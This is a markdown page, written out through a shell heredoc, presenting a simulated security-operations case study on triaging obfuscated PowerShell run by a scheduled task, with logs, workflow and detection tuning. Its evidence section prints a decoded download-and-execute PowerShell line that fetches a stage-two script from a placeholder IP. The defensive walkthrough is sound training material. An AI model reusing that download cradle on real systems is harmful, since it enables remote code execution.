cat <<'EOF' > docs/investigations/index.md
# Operational Investigations & Threat Triage

Structured walkthroughs of alert triage, raw log correlation, and forensic analysis across simulated threat scenarios. Documenting investigation methodologies, detection logic, and false-positive reduction.

<div style="display: flex; gap: var(--psv-space-2); flex-wrap: wrap; margin-top: var(--psv-space-4); margin-bottom: var(--psv-space-6);">
  <span class="md-button md-button--primary" style="font-size: 0.75rem; padding: 4px 12px;">All</span>
  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">SIEM &amp; Log Analysis</span>
  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">Network &amp; PCAP</span>
  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">Endpoint Telemetry</span>
  <span class="md-button" style="font-size: 0.75rem; padding: 4px 12px;">False Positives</span>
</div>

---

## Featured Case Study — ID: INV-024

### Investigating Obfuscated PowerShell Execution via Scheduled Tasks

<div style="display: flex; gap: var(--psv-space-2); flex-wrap: wrap; margin-bottom: var(--psv-space-4);">
  <span style="background: rgba(245, 158, 11, 0.1); color: var(--psv-warning); border: 1px solid var(--psv-warning); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
    Severity: Medium
  </span>
  <span style="background: rgba(16, 185, 129, 0.1); color: var(--psv-success); border: 1px solid var(--psv-success); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
    Status: Closed / Resolved
  </span>
  <span style="background: rgba(56, 189, 248, 0.1); color: var(--psv-accent); border: 1px solid var(--psv-accent); font-size: 0.65rem; font-weight: 700; padding: 2px 8px; border-radius: var(--psv-radius-sm);">
    Category: Host Telemetry &amp; SIEM
  </span>
</div>

<div style="display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: var(--psv-space-6); font-size: 0.825rem;">

  <div>
    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
        1. Incident Trigger &amp; Initial Context
      </h3>
      <ul>
        <li><strong>Alert Name:</strong> <code>SUSPICIOUS_POWERSHELL_BASE64_EXEC</code></li>
        <li><strong>Trigger Source:</strong> Windows Security Event Log (Event ID 4688) on endpoint <code>HOST-FIN-02</code>.</li>
        <li><strong>Initial Observation:</strong> An automated SIEM alert flagged an obfuscated PowerShell command executing under the SYSTEM account outside standard maintenance hours.</li>
      </ul>
    </div>

    <div class="psv-card">
      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
        3. Investigation &amp; Triage Workflow
      </h3>
      <ol>
        <li><strong>Payload Decoding:</strong> Extracted the Base64 string from Sysmon Event ID 1 and decoded the payload using CyberChef to identify the outbound destination.</li>
        <li><strong>Parent-Child Process Analysis:</strong> Verified that <code>powershell.exe</code> was spawned directly by <code>taskeng.exe</code> (Windows Scheduled Tasks Engine), confirming automated persistence rather than interactive execution.</li>
        <li><strong>Network Telemetry Correlation:</strong> Cross-referenced network firewall logs for outbound connections to <code>192.0.2.45</code>. Identified 12 outbound connection attempts within a 3-minute window.</li>
        <li><strong>Host Verification:</strong> Interviewed the system administration team and checked local task scheduler definitions. Confirmed an unannounced legacy maintenance script was executing without updated service account encapsulation.</li>
      </ol>
    </div>
  </div>

  <div>
    <div class="psv-card" style="margin-bottom: var(--psv-space-4);">
      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
        2. Telemetry &amp; Log Evidence
      </h3>

      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-bottom: 4px;"><strong>Sysmon Event ID 1 (Process Creation):</strong></p>

```text
UtcTime: 2026-07-12 02:14:08.112
ProcessId: 4820
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
CommandLine: powershell.exe -NoP -NonI -W Hidden -e aXdX... [Base64 Truncated]
ParentImage: C:\Windows\System32\taskeng.exe
User: NT AUTHORITY\SYSTEM
```

      <p style="font-size: 0.75rem; color: var(--psv-text-muted); margin-top: 8px; margin-bottom: 4px;"><strong>Script Block Logging (Windows Event ID 4104) Decoded Payload:</strong></p>

```powershell
$cli = New-Object System.Net.WebClient
$data = $cli.DownloadString('http://192.0.2.45/stage2.ps1')
Invoke-Expression $data
```

    </div>

    <div class="psv-card">
      <h3 style="color: var(--psv-accent); font-size: 0.95rem; margin-top: 0; margin-bottom: var(--psv-space-3);">
        4. Root Cause &amp; Detection Tuning
      </h3>

      <p style="color: var(--psv-text-muted); margin-bottom: var(--psv-space-2);">
        <strong>Verdict:</strong> Authorized Administrator Misconfiguration (True Positive for policy violation, False Positive for active malware).
      </p>

      <strong style="color: var(--psv-text); font-size: 0.75rem; display: block; margin-bottom: var(--psv-space-1);">Remediation &amp; Detection Tuning:</strong>

      <ul>
        <li>Reconfigured the admin task to run via a dedicated service account with restricted privileges.</li>
        <li>Updated the SIEM detection rule to alert specifically on unquoted administrative script paths while keeping base-64 PowerShell flags flagged for non-standard parent processes.</li>
      </ul>
    </div>
  </div>

</div>

[Explore the Investigations Vault →](https://investigations.privacyskillvault.com/){ .md-button .md-button--primary }

EOF